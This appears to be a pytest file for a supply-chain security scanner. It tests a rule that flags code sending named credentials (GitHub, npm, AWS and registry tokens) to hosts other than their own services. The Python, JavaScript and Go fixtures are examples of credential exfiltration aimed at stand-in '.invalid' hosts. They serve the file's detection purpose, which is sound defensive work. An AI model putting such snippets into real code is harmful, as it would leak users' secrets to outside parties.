"""L1: one named credential sent to a host outside its service, outside any install hook.

The snippets are inert: they name reserved `.invalid` hosts (RFC 2606), which resolve nowhere, and
are only ever parsed, never run.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared.credential_homes import (
    CREDENTIAL_HOMES,
    ECOSYSTEM_CREDENTIALS,
    OTHER_HOMES,
    SecretFlow,
)
from cordon_scanner.detect.code.secretflow import GoFlow, JavaScriptFlow
from cordon_scanner.ecosystems.registry import EcosystemRegistry
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.EXFIL.NAMED_SECRET.001"
GO_HEAD = 'package main\n\nimport (\n\t"net/http"\n\t"os"\n\t"strings"\n)\n\n'


class FlowHelpers:
    @staticmethod
    def fired(tmp_path: Path, name: str, body: str) -> bool:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)


class TestHomes:
    @pytest.mark.parametrize(
        ("name", "host", "expected"),
        [
            ("GITHUB_TOKEN", "api.github.com", False),
            ("GITHUB_TOKEN", "github.mycorp.example", False),
            ("GITHUB_TOKEN", "metrics.example.invalid", True),
            ("NPM_TOKEN", "registry.npmjs.org", False),
            ("NPM_TOKEN", "npm.internal.example", False),
            ("NPM_TOKEN", "artifactory.corp.example", False),
            ("NPM_TOKEN", "collector.example.invalid", True),
            ("AWS_SECRET_ACCESS_KEY", "collector.example.invalid", True),
            ("AWS_SECRET_ACCESS_KEY", "app.terraform.io", False),
            ("AWS_SECRET_ACCESS_KEY", "localhost", False),
            ("MY_SERVICE_API_KEY", "anywhere.example.invalid", False),
            ("GITHUB_TOKEN", None, False),
        ],
    )
    def test_misdirected(self, name, host, expected) -> None:
        assert SecretFlow.misdirected(name, host) is expected


#: Each registry credential, the host of its own registry.
REGISTRY_CREDENTIALS = [
    ("HEX_API_KEY", "hex.pm"),
    ("COMPOSER_AUTH", "packagist.org"),
    ("CONAN_PASSWORD", "center2.conan.io"),
    ("CONAN_PASSWORD_MYREMOTE", "center2.conan.io"),
    ("TF_TOKEN_app_terraform_io", "app.terraform.io"),
    ("TF_TOKEN_registry_terraform_io", "registry.terraform.io"),
    ("ANSIBLE_GALAXY_TOKEN", "galaxy.ansible.com"),
    ("CACHIX_AUTH_TOKEN", "app.cachix.org"),
    ("VSCE_PAT", "marketplace.visualstudio.com"),
    ("OVSX_PAT", "open-vsx.org"),
    ("GRADLE_PUBLISH_KEY", "plugins.gradle.org"),
    ("GRADLE_PUBLISH_SECRET", "plugins.gradle.org"),
    ("ANACONDA_API_TOKEN", "api.anaconda.org"),
    ("COCOAPODS_TRUNK_TOKEN", "trunk.cocoapods.org"),
    ("HOMEBREW_GITHUB_API_TOKEN", "api.github.com"),
    ("HOMEBREW_DOCKER_REGISTRY_TOKEN", "ghcr.io"),
    ("HOMEBREW_DOCKER_REGISTRY_BASIC_AUTH_TOKEN", "ghcr.io"),
    ("MAVEN_USERNAME", "repo1.maven.org"),
    ("MAVEN_CENTRAL_TOKEN", "central.sonatype.com"),
    ("HACKAGE_KEY", "hackage.haskell.org"),
    ("HACKAGE_PASSWORD", "hackage.haskell.org"),
]


class TestEveryEcosystemsCredential:
    @pytest.mark.parametrize(("name", "host"), REGISTRY_CREDENTIALS)
    def test_a_registry_credential_is_fine_at_its_own_registry(self, name, host) -> None:
        assert SecretFlow.home_of(name) is not None
        assert not SecretFlow.misdirected(name, host)

    @pytest.mark.parametrize(("name", "host"), REGISTRY_CREDENTIALS)
    def test_and_misdirected_anywhere_else(self, name, host) -> None:
        assert SecretFlow.misdirected(name, "collect.example.invalid")

    def test_every_ecosystem_has_a_credential_or_a_reason(self) -> None:
        assert set(ECOSYSTEM_CREDENTIALS) == set(EcosystemRegistry.BY_ID)
        for ecosystem, credential in ECOSYSTEM_CREDENTIALS.items():
            assert bool(credential.homes) != bool(credential.reason), ecosystem

    def test_only_the_ecosystems_that_cannot_name_one_are_reasons(self) -> None:
        assert {e for e, c in ECOSYSTEM_CREDENTIALS.items() if c.reason} == {
            "cran",
            "gomod",
            "helm",
            "pub",
            "swift",
        }

    def test_the_detectors_homes_are_this_table(self) -> None:
        """What `SecretFlow` judges by is built from `ECOSYSTEM_CREDENTIALS` and the homes no ecosystem uses, nothing else."""
        named = [home for c in ECOSYSTEM_CREDENTIALS.values() for home in c.homes]
        assert set(CREDENTIAL_HOMES) == {*OTHER_HOMES, *named}
        assert len(CREDENTIAL_HOMES) == len(set(CREDENTIAL_HOMES))

    def test_a_maven_settings_file_is_a_credential_store(self) -> None:
        assert SecretFlow.store_of(["~", ".m2", "settings.xml"]) == "m2"


class TestPython:
    def test_a_secret_concatenated_into_a_url(self, tmp_path) -> None:
        body = (
            "import os, urllib.request\n"
            'urllib.request.urlopen("https://c.example.invalid/v1?k=" + os.environ.get("AWS_SECRET_ACCESS_KEY"))\n'
        )
        assert FlowHelpers.fired(tmp_path, "goodlib/_telemetry.py", body)

    def test_through_variables(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'TOKEN = os.getenv("NPM_TOKEN")\n'
            'URL = "https://m.example.invalid/c"\n'
            'requests.post(URL, data={"t": TOKEN})\n'
        )
        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)

    def test_an_api_client_calling_its_own_service(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'tok = os.environ["GITHUB_TOKEN"]\n'
            'requests.get("https://api.github.com/user", headers={"Authorization": "token " + tok})\n'
        )
        assert not FlowHelpers.fired(tmp_path, "client.py", body)

    def test_a_configured_destination_is_not_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'requests.post(os.environ["VAULT_ADDR"], json={"k": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
        )
        assert not FlowHelpers.fired(tmp_path, "register.py", body)

    def test_a_generic_key_is_not_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'requests.get("https://api.weather.example.invalid/v1?key=" + os.environ["WEATHER_API_KEY"])\n'
        )
        assert not FlowHelpers.fired(tmp_path, "weather.py", body)

    def test_test_code_is_exempt(self, tmp_path) -> None:
        body = (
            "import os, urllib.request\n"
            'urllib.request.urlopen("https://c.example.invalid/?k=" + os.environ["GITHUB_TOKEN"])\n'
        )
        assert not FlowHelpers.fired(tmp_path, "tests/test_upload.py", body)


class TestAUrlIsReadInTheScopeItIsBoundIn:
    """`url` in one function is not the `url` another function is handed: a parameter's host is not
    known, and a host a different function wrote down is not its host (`PythonSyntax.name_scope`)."""

    def test_a_parameter_is_not_the_url_another_function_assigned(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            "def lookup():\n"
            '    url = "https://m.example.invalid/c"\n'
            "    return requests.get(url)\n"
            "def authed(url):\n"
            '    return requests.get(url, headers={"Authorization": "token " + os.environ["GITHUB_TOKEN"]})\n'
        )
        assert not FlowHelpers.fired(tmp_path, "client.py", body)

    def test_a_url_assigned_in_the_same_function_is_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            "def send():\n"
            '    url = "https://m.example.invalid/c"\n'
            '    requests.post(url, data={"t": os.environ["NPM_TOKEN"]})\n'
        )
        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)

    def test_a_module_constant_read_in_a_function_is_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'URL = "https://m.example.invalid/c"\n'
            "def send():\n"
            '    requests.post(URL, data={"t": os.environ["NPM_TOKEN"]})\n'
        )
        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)

    def test_a_url_of_the_enclosing_function_is_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            "def main():\n"
            '    url = "https://m.example.invalid/c"\n'
            "    def send():\n"
            '        requests.post(url, data={"t": os.environ["NPM_TOKEN"]})\n'
            "    send()\n"
        )
        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)


class TestJavaScript:
    def test_a_bound_token_in_a_fetch(self, tmp_path) -> None:
        body = (
            'const t = process.env.GITHUB_TOKEN;\nfetch("https://cdn.example.invalid/p?x=" + t);\n'
        )
        assert FlowHelpers.fired(tmp_path, "index.js", body)

    def test_a_destructured_token_in_a_template(self, tmp_path) -> None:
        body = (
            "const { NPM_TOKEN } = process.env;\n"
            'const https = require("https");\n'
            "https.get(`https://x.example.invalid/${NPM_TOKEN}`);\n"
        )
        assert FlowHelpers.fired(tmp_path, "lib/index.js", body)

    def test_a_url_bound_to_a_name(self, tmp_path) -> None:
        body = (
            'const endpoint = "https://h.example.invalid/collect";\n'
            "axios.post(endpoint, { t: process.env.AWS_SESSION_TOKEN });\n"
        )
        assert FlowHelpers.fired(tmp_path, "src/telemetry.ts", body)

    def test_the_registry_with_its_own_token(self, tmp_path) -> None:
        body = (
            "const t = process.env.NPM_TOKEN;\n"
            'fetch("https://registry.npmjs.org/-/whoami", {headers: {authorization: `Bearer ${t}`}});\n'
        )
        assert not FlowHelpers.fired(tmp_path, "publish.js", body)

    def test_no_literal_host_no_claim(self, tmp_path) -> None:
        body = "fetch(process.env.API_URL, {headers: {t: process.env.GITHUB_TOKEN}});\n"
        assert not FlowHelpers.fired(tmp_path, "client.js", body)

    def test_another_url_in_a_header_is_not_the_destination(self, tmp_path) -> None:
        body = (
            "const t = process.env.GITHUB_TOKEN;\n"
            'fetch("https://api.github.com/user", {headers: {authorization: `Bearer ${t}`, referer: "https://app.example.invalid"}});\n'
        )
        assert not FlowHelpers.fired(tmp_path, "client.js", body)

    def test_a_url_in_a_name_used_for_a_header_is_not_the_destination(self, tmp_path) -> None:
        body = (
            "const t = process.env.NPM_TOKEN;\n"
            'const site = "https://app.example.invalid";\n'
            'fetch("https://registry.npmjs.org/-/whoami", {headers: {authorization: `Bearer ${t}`, origin: site}});\n'
        )
        assert not FlowHelpers.fired(tmp_path, "client.js", body)

    def test_the_url_in_an_options_object_is_the_destination(self, tmp_path) -> None:
        body = (
            "const t = process.env.GITHUB_TOKEN;\n"
            'axios({url: "https://c.example.invalid/p", headers: {authorization: `Bearer ${t}`}});\n'
        )
        assert FlowHelpers.fired(tmp_path, "client.js", body)

    def test_the_flow_reports_offset_name_and_host(self) -> None:
        text = (
            'const t = process.env.GITHUB_TOKEN;\nfetch("https://cdn.example.invalid/p?x=" + t);\n'
        )
        [(offset, name, host)] = JavaScriptFlow.findings(text)
        assert text[offset:].startswith("fetch") and name == "GITHUB_TOKEN"
        assert host == "cdn.example.invalid"


# The same claim in Go (`GoFlow`): a program that read a named credential from the environment and
# put it in a request to another host was read by nobody. Reserved `.invalid` hosts only.


class TestAGoProgramSendingANamedCredentialElsewhere:
    def test_a_bound_token_in_a_request_body(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\treq, _ := http.NewRequest("POST", "https://c.example.invalid/v1", strings.NewReader(token))\n'
            "\thttp.DefaultClient.Do(req)\n"
            "}\n"
        )
        assert FlowHelpers.fired(tmp_path, "main.go", body)

    def test_a_token_set_as_a_header_after_the_request_is_made(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("NPM_TOKEN")\n'
            '\treq, _ := http.NewRequest("GET", "https://c.example.invalid/v1", nil)\n'
            '\treq.Header.Set("X-Token", token)\n'
            "\thttp.DefaultClient.Do(req)\n"
            "}\n"
        )
        assert FlowHelpers.fired(tmp_path, "main.go", body)

    def test_a_token_handed_to_a_helper_that_sends_it(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func send(k string) {\n"
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(k))\n'
            "}\n\n"
            "func main() {\n"
            '\tkey := os.Getenv("AWS_SECRET_ACCESS_KEY")\n'
            "\tsend(key)\n"
            "}\n"
        )
        assert FlowHelpers.fired(tmp_path, "cmd/main.go", body)

    def test_the_getenv_made_inline_in_the_call(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func send(k string) {\n"
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(k))\n'
            "}\n\n"
            "func main() {\n"
            '\tsend(os.Getenv("GITLAB_TOKEN"))\n'
            "}\n"
        )
        assert FlowHelpers.fired(tmp_path, "main.go", body)

    def test_a_url_bound_to_a_name(self, tmp_path) -> None:
        body = GO_HEAD + (
            'const collector = "https://c.example.invalid/v1"\n\n'
            "func report() {\n"
            '\ttoken := os.Getenv("SLACK_BOT_TOKEN")\n'
            '\thttp.Post(collector, "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        assert FlowHelpers.fired(tmp_path, "main.go", body)

    def test_the_flow_reports_offset_name_and_host(self) -> None:
        text = GO_HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        [(offset, name, host)] = GoFlow.findings(text)
        assert text[offset:].startswith("http.Post") and name == "GITHUB_TOKEN"
        assert host == "c.example.invalid"


class TestWhatIsNotAGoClaim:
    def test_the_token_sent_to_its_own_service(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func whoami() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\treq, _ := http.NewRequest("GET", "https://api.github.com/user", nil)\n'
            '\treq.Header.Set("Authorization", "Bearer "+token)\n'
            "\thttp.DefaultClient.Do(req)\n"
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, "main.go", body)

    def test_a_setting_that_is_not_a_credential(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func report() {\n"
            '\tport := os.Getenv("PORT")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(port))\n'
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, "main.go", body)

    def test_no_literal_host_no_claim(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\thttp.Post(os.Getenv("COLLECTOR_URL"), "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, "main.go", body)

    def test_a_key_that_has_no_home_we_can_know(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func report() {\n"
            '\tkey := os.Getenv("MY_SERVICE_API_KEY")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(key))\n'
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, "main.go", body)

    def test_the_function_that_also_calls_the_keys_service_makes_no_claim(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func sync() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\treq, _ := http.NewRequest("GET", "https://api.github.com/user", nil)\n'
            '\treq.Header.Set("Authorization", "Bearer "+token)\n'
            "\thttp.DefaultClient.Do(req)\n"
            '\thttp.Post("https://stats.example.invalid/v1", "text/plain", strings.NewReader("done"))\n'
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, "main.go", body)

    def test_a_credential_read_in_another_function_than_the_send(self, tmp_path) -> None:
        body = GO_HEAD + (
            "func load() string {\n"
            '\treturn os.Getenv("GITHUB_TOKEN")\n'
            "}\n\n"
            "func ping() {\n"
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader("up"))\n'
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, "main.go", body)

    @pytest.mark.parametrize("name", ["main_test.go"])
    def test_a_test_file(self, tmp_path, name) -> None:
        body = GO_HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        assert not FlowHelpers.fired(tmp_path, name, body)
